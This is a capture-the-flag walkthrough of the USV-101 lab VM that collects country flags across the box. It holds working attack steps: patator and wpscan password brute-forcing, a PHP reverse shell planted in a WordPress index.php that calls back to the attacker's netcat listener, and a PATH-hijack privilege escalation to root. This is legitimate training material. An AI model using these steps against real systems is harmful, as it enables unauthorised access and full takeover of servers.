Recon phase 

First try to get the IP address of VM
$ netdiscover -r 192.168.190.0/24 -i vmnet1
192.168.190.132

Then scanning the address with nmap
$ nmap -p 1-65535 -T4 -A -v 192.168.190.132
-- You can see the nmap dump here
https://github.com/Hamza-Megahed/CTFs/blob/master/usv-101/scan/USV.nmap
==========================================================================================
ssh root@192.168.190.132

                                                 /===-_---~~~~~~~~~------____
                    A                            |===-~___E                _,-'S
                 -==\\                         `//~\\   ~~~~`---.___.-~~
             ______-==|                         | |  \\           _-~`
       __--~~~  ,-/-==\\                        | |   `\        ,'
    _-~       /'    |  \\                      / /      \      /
  .'        /       |   \\                   /' /        \   /'
 /  ____  /         |    \`\.__/-~~ ~ \ _ _/'  /          \/'
/-'~    ~~~~~---__  |     ~-/~         ( )   /'        _--~`
                  \_|      /        _)   ;  ),   __--~~
                    '~~--_/      _-~/-  / \   '-~ \
                   {\__--_/}    / \\_>- )<__\      \
                   /'   (_/  _-~  | |__>--<__|      | 
                  |0  0 _/) )-~     | |__>--<__|      |
                  / /~ ,_/       / /__>---<__/      |  
                 o o _//        /-~_>---<__-~      /
                 (^(~E         /~_>-C-<__-      _-B              
                ,/|           /__>--<__/     _-~                 
             ,//('(          |__>--<__|     /                  .----_ 
            ( ( '))          |__>--<__|    |                 /' _---_~\
         `-)) )) (           |__>--<__|    |               /'  /     ~\`\
        ,/,'//( (             \__>--<__\    \            /'  //        ||
      ,( ( ((, ))              ~-__>--<_~-_  ~--____---~' _/'/          xxxxx0000000xxxxxx
    `~/  )` ) ,/|                 ~-_~>--<_/-__       __-~ _/ 
  ._-~//( )/ )) `                    ~~-'_/_/ /~~~~~~~__--~ 
   ;'( ')/ ,)(                              ~~~~~~~~~~ 
  ' ') '( (/
    '   '  `   



wDOW0gW/QssEtq5Y3nHX4XlbH/Dnz27qHFhHVpMulJSyDCvex++YCd42tx7HKGgB


as you can see a hash
wDOW0gW/QssEtq5Y3nHX4XlbH/Dnz27qHFhHVpMulJSyDCvex++YCd42tx7HKGgB
and in the ascii drawing there is AES and ECB and xxxxx0000000xxxxxx
so we assume the key is xxxxx0000000xxxxxx and the algorithm is AES with ECB mode
after decrypt that online
Italy Flag: 0047449b33fbae830d833721edaef6f1
==========================================================================================
Squid proxy is active and running on the server (From Nmap results)
using Squid http proxy on port 3129 on firefox and then access the webserver
then using dirb to extract files on the server
$ dirb http://192.168.190.132 -R -o dirb.txt -p 192.168.190.132:3129
-- You can see the dirb dump here
https://github.com/Hamza-Megahed/CTFs/blob/master/usv-101/scan/dirb.txt
then tried to access /blog via proxy and i got wordpress then clicked on i have a message for you
then i navigated to /blog/hodor and gave me a zip file . after extraction

$ echo UG9ydHVnYWwgRmxhZzogYTI2NjNiMjMwNDVkZTU2YzdlOTZhNDA2NDI5ZjczM2Y= | base64 -d
Portugal Flag: a2663b23045de56c7e96a406429f733f
==========================================================================================
at the end of the blog page there is Protected: The secret Chapter
i tried to extract all words of this page and put it in one file and use it as wordlist
cewl --proxy_host 192.168.190.132 --proxy_port 3129 http://192.168.190.132/blog/ > words.lst

//You can find it here
https://github.com/Hamza-Megahed/CTFs/blob/master/usv-101/wordlists/words.lst
the use patator to brute force or you can use burpsuite

$patator http_fuzz http_proxy=192.168.190.132:3129 url='http://192.168.190.132/blog/wp-login.php?action=postpass' method=POST header='Referer: "http://192.168.190.132/blog/index.php/2016/10/16/the-secret-chapter/"' body='post_password=FILE0&Submit=Enter' 0=words.lst -x ignore:fgrep='post-password-form' follow=1 accept_cookie=1

and the password is "Westerosi"

and the hash UGFyYWd1YXkgRmxhZzogNDc2MWI2NWYyMDA1MzY3NDY1N2M3ZTYxODY2MjhhMjk=

then
$ echo UGFyYWd1YXkgRmxhZzogNDc2MWI2NWYyMDA1MzY3NDY1N2M3ZTYxODY2MjhhMjk= | base64 -d
Paraguay Flag: 4761b65f20053674657c7e6186628a29
==========================================================================================
Notice

The mother_of_dragons has a password which is in front of your eyes
Then
She uses the Field Training Preparation for her army ---> FTP

i tried to access ftp via port 21211 with username "mother_of_dragons"
and password in front of your eyes
then i did ls and i found readme.txt which contain I keep a hidden note for myself
then i tried ls -a i found .note.txt which contain
"I always forgot passwords, so for my blog account I used  my children`s name.

-= Daenerys =-""
names of Daenerys's dragons are Rhaegal Viserion Drogon
i generated 2 wordlists as password one with capital initials and one with not
$ crunch 1 1 -p Rhaegal Viserion Drogon > wordpress.pass
$ crunch 1 1 -p rhaegal viserion drogon > wordpress2.pass

//you can find it here
https://github.com/Hamza-Megahed/CTFs/blob/master/usv-101/wordlists/wordpress.pass
then i tried brute force using wpscan
$ wpscan --proxy 192.168.190.132:3129 --url http://192.168.190.132/blog/ --wordlist wordpress.pass --username mother_of_dragons

Brute Forcing 'mother_of_dragons'
+----+-------------------+------+-----------------------+
| Id | Login             | Name | Password              |
+----+-------------------+------+-----------------------+
|    | mother_of_dragons |      | RhaegalDrogonViserion |
+----+-------------------+------+-----------------------+

i noticed something in the output
[+] Interesting header: X-XSS-PROTECTION:
Q3JvYXRpYSBGbGFnOiAwYzMyNjc4NDIxNDM5OGFlYjc1MDQ0ZTljZDRjMGViYg==
then

$ echo Q3JvYXRpYSBGbGFnOiAwYzMyNjc4NDIxNDM5OGFlYjc1MDQ0ZTljZDRjMGViYg== | base64 -d
Croatia Flag: 0c326784214398aeb75044e9cd4c0ebb
==========================================================================================
Then access via wordpress with username mother_of_dragons and password RhaegalDrogonViserion

the i searched in the panel and found Biographical Info
then
$ echo VGhhaWxhbmQgRmxhZzogNmFkNzk2NWQxZTA1Y2E5OGIzZWZjNzZkYmY5ZmQ3MzM= | base64 -d
Thailand Flag: 6ad7965d1e05ca98b3efc76dbf9fd733
==========================================================================================
Then i edited the index.php by adding php reverse shell
http://pentestmonkey.net/tools/web-shells/php-reverse-shell
and change those parameters to reconnect to your local machine 
$ip = '192.168.190.1'; 
$port = 1234;
Then i updated the changes
then started netcat in listening mode
$ nc -lvp 1234
Then refresh the index page and the shell session started

then navigate to /srv/http
$ cat reward_flag.txt
TW9uZ29saWEgRmxhZzogNmI0OWMxM2NjY2Q5MTk0MGYwOWQ3OWUxNDIxMDgzOTQ=
then
$ echo TW9uZ29saWEgRmxhZzogNmI0OWMxM2NjY2Q5MTk0MGYwOWQ3OWUxNDIxMDgzOTQ= | base64 -d
Mongolia Flag: 6b49c13cccd91940f09d79e142108394
==========================================================================================
there is a file winterfell_messenger owned by root when i tried to execute it
cat: /root/message.txt: No such file or directory

then i tried to execute bash as cat instead (priv escalation)
$ echo "/bin/bash" > /tmp/cat   // (don't try cp command it won't work)
$ chmod +x /tmp/cat
then add /tmp to default path
$ PATH=/tmp:$PATH
$ ./winterfell_messenger
$ whoami
root
$ id
uid=0(root) gid=33(http) groups=33(http)

then 
$ cd /root
$ ls -a
$ less .flag.txt
                                                                            ,aa,       ,aa
Congratulations!                                                           d"  "b    ,d",`b
                                                                         ,dP a  "b,ad8' 8 8
                                                                         d8' 8  ,8P'Y8a 8 8
                                                                        d8baa8baP'    `Y8a8
                                                                     ,adP"'               Y,
                                                                  ,a8P"               a   `b
                                                              ,aadP"              (0  Y, 0 8
                          ____________________________,,aaddPP""'8'         I          "a  8
                    ,aad8PP"""""""""""""""""""""""""""""'        8,         `b,          "aP
                ,adP"                                             "a          "ba,.     d888
             ,dP"                                                   "a,           "a,   `88'
            a"                                                         "'           `""8"'
           d"                                                                        ,8'
          d"                                                                        ,8'
          8                                                                       ,a8'
          8                         b                                            aP"
          8                         `b                                         ,8"
         (8    b,                    `b,                 a,                   dP'
         I8    `8,                    `b                d'                 ,aP"
         8'     `8,                   ,P               d'               ,a8P"
        I8       "b                  ,8'              ,8             ,d"d"'
       ,8'        8b               ,dP""""""""""""""""Y8           ,d",d'
     ,d"         d"8b            ,dP'                  "b,        ,P' d'
   ,d"         ,d' dPb,        ,dP'                      "b,      8'  8
  d"         ,d" ,d"  8      ,d"'                         `b      P   8
 d"        ,d" ,d"  ,d"    ,d"                             8      I   8
d"      ,dP' ,d"  ,d"    ,d"                               8      I   8
8,  ,ad8P' ,d"   (P'    d"                                 8      8   8
"YP"'"8   ,8'    Ib    d"                                  Y      8   8
      8   d"     `8    8                                   `b     8   Y
      8   8       8,   8,                                   8     Y   `b
      8   Y,      `b   `b                                   Y     `b   `b
      Y,   "ba,    `b   `b,                                 `b     8,   `"ba,
       "b,   "8     `b    `""b                               `b     `Yaa,adP'
         """""'      `baaaaaaP                                `YaaaadP"'



U29tYWxpYSBGbGFnOiA0YTY0YTU3NWJlODBmOGZmYWIyNmIwNmE5NThiY2YzNA==


$ echo U29tYWxpYSBGbGFnOiA0YTY0YTU3NWJlODBmOGZmYWIyNmIwNmE5NThiY2YzNA== | base64 -d
Somalia Flag: 4a64a575be80f8ffab26b06a958bcf34
==========================================================================================